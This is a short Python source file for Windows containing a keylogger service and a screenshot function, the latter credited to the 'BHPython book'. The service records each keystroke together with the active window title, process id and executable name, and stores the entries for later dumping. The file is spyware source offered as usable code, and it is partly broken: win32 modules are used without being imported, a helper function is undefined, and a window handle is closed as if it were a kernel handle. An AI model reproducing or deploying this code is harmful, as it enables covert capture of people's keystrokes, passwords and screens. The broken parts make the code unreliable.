# -*- coding: utf-8 -*-

from ctypes import byref, create_string_buffer, c_ulong, windll
import collections
import datetime

from pynput import keyboard


def screenshot(name):
    # From BHPython book.
    hdesktop = win32gui.GetDesktopWindow()
    width, height, left, top = get_dimensions()

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0, 0), (width, height),
            img_dc, (left, top), win32con.SRCCOPY)
    screenshot.SaveBitmapFile(mem_dc, '{}.bmp'.format(name))

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())


class KeyloggerService:

    def __init__(self):
        self.listener = None
        self._dq = collections.deque(maxlen=1000)

    def keylogger_start(self):
        if self.listener is not None:
            return
        self.listener = keyboard.Listener(
                on_press=self._on_press,
                on_release=self._on_release,
        )
        self.listener.start()
        entry = {
                'event': 'Keylogger.start',
                'time': datetime.datetime.now(),
        }
        self._dq.append(entry)

    def keylogger_dump(self):
        return self._dq

    def keylogger_stop(self):
        if self.listener is None:
            return
        self.listener.stop()
        self.listener = None
        entry = {
                'event': 'Keylogger.stop',
                'time': datetime.datetime.now(),
        }
        self._dq.append(entry)

    def _on_press(self, key):
        pass

    def _on_release(self, key):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = '{}'.format(pid.value)
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(
                h_process, None, byref(executable), 512,
        )
        executable = executable.value.decode()
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            window_title = window_title.value.decode()
        except UnicodeDecodeError:
            window_title = ''

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

        try:
            key = key.char
        except AttributeError:
            key = str(key)

        entry = {
                'event': 'Key.release',
                'key': str(key),
                'time': datetime.datetime.now(),
                'title': window_title,
                'pid': process_id,
                'exe': executable,
        }
        self._dq.append(entry)

